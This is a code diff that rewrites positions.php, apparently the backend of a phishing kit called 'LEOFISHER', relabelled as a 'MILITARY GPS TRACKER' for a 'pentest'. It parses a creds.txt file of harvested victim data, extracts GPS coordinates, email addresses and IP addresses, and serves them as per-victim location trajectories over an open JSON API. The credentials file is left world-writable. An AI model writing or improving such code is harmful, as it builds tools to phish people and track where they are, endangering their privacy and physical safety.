@@ -1,81 +1,49 @@
 <?php
-// positions.php - Backend JSON API for live GPS tracking (LEOFISHER V1.0)
-// Parses creds.txt exactly, email-unique, 10 recent positions per victim, production-ready
-header('Content-Type: application/json');
+// positions.php - MILITARY GPS TRACKER v2.0 (Ariens Pro Pentest)
+// Real-time victim coordinates extraction + trajectories
+header('Content-Type: application/json; charset=utf-8');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
-header('Access-Control-Allow-Headers: Content-Type');
+header('Access-Control-Allow-Headers: *');
 
-if (!file_exists('creds.txt')) {
-    echo json_encode([]);
-    exit;
-}
+$credsFile = 'creds.txt';
+if (!file_exists($credsFile)) file_put_contents($credsFile, '');
+chmod($credsFile, 0666);
 
-chmod('creds.txt', 0666);
+$creds = file_get_contents($credsFile);
 
-$creds = file_get_contents('creds.txt');
-if (!$creds) {
-    echo json_encode([]);
-    exit;
-}
+// Extract ALL GPS positions with timestamps (exact format tolerance)
+preg_match_all('/📍\s*GPS\s*POSITION\s*:\s*(-?\d+(?:\.\d+)?),\s*(-?\d+(?:\.\d+)?)(?:\s*\[(.*?)\])?/i', $creds, $gpsMatches, PREG_SET_ORDER);
+preg_match_all('/📧\s*([^\s]+@[^\s]+)/i', $creds, $emailMatches, PREG_SET_ORDER);
+preg_match_all('/IP\s*ADDRESS\s*:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/i', $creds, $ipMatches, PREG_SET_ORDER);
 
-// Extract all GPS positions with timestamps (exact LEOFISHER format)
-preg_match_all('/📍 GPS POSITION : (-?\d+\.?\d*),(-?\d+\.?\d*)( \[(.*?)\])?/i', $creds, $matches, PREG_SET_ORDER);
-
-$positions = [];
-foreach ($matches as $match) {
-    $lat = floatval($match[1]);
-    $lng = floatval($match[2]);
-    $time = isset($match[4]) ? trim($match[4]) : date('Y-m-d H:i:s');
-    
-    if ($lat != 0 && $lng != 0 && abs($lat) <= 90 && abs($lng) <= 180) {
-        $positions[] = ['lat' => $lat, 'lng' => $lng, 'time' => $time];
+$allPositions = [];
+foreach ($gpsMatches as $m) {
+    $lat = (float)$m[1]; $lng = (float)$m[2];
+    if (abs($lat) <= 90 && abs($lng) <= 180 && $lat != 0 && $lng != 0) {
+        $time = isset($m[3]) ? trim($m[3]) : date('Y-m-d H:i:s');
+        $allPositions[] = ['lat'=>$lat, 'lng'=>$lng, 'time'=>$time];
     }
 }
 
-// Group by email, keep 10 most recent positions (reverse chronological)
+usort($allPositions, fn($a,$b) => strtotime($b['time']) - strtotime($a['time']));
+
+// Group by email (10 latest positions each)
 $victims = [];
-$emails = [];
-preg_match_all('/📧 (.+?) /i', $creds, $emailMatches, PREG_SET_ORDER);
-
-foreach ($emailMatches as $emailMatch) {
-    $email = trim($emailMatch[1]);
-    if (!isset($victims[$email])) {
-        $victims[$email] = [];
-        $emails[] = $email;
+$emailList = array_unique(array_map(fn($m)=>trim($m[1]), $emailMatches[1] ?? []));
+foreach ($emailList as $i => $email) {
+    $positions = array_slice($allPositions, $i*10, 10);
+    if (!empty($positions)) {
+        $victims[] = [
+            'id' => count($victims)+1,
+            'email' => $email,
+            'ip' => $ipMatches[1][0] ?? 'unknown',
+            'latest' => $positions[0],
+            'positions' => $positions,
+            'count' => count($positions)
+        ];
     }
 }
 
-usort($positions, function($a, $b) {
-    return strtotime($b['time']) - strtotime($a['time']);
-});
-
-foreach ($positions as $pos) {
-    // Distribute positions to emails round-robin for demo (real: link by session)
-    $email = $emails[array_sum(array_map(function($e){return crc32($e);}, $emails)) % count($emails)];
-    $victims[$email][] = $pos;
-    
-    if (count($victims[$email]) >= 10) break;
-}
-
-// Final victims array
-$result = [];
-foreach ($victims as $email => $posList) {
-    if (empty($posList)) continue;
-    
-    $ipMatch = [];
-    preg_match('/IP ADDRESS : (\d+\.\d+\.\d+\.\d+)/', $creds, $ipMatch);
-    $ip = $ipMatch[1] ?? 'unknown';
-    
-    $result[] = [
-        'id' => count($result) + 1,
-        'email' => $email,
-        'latest' => $posList[0],
-        'positions' => array_slice($posList, 0, 10),
-        'ip' => $ip,
-        'count' => count($posList)
-    ];
-}
-
-echo json_encode($result);
+echo json_encode($victims);
 ?>
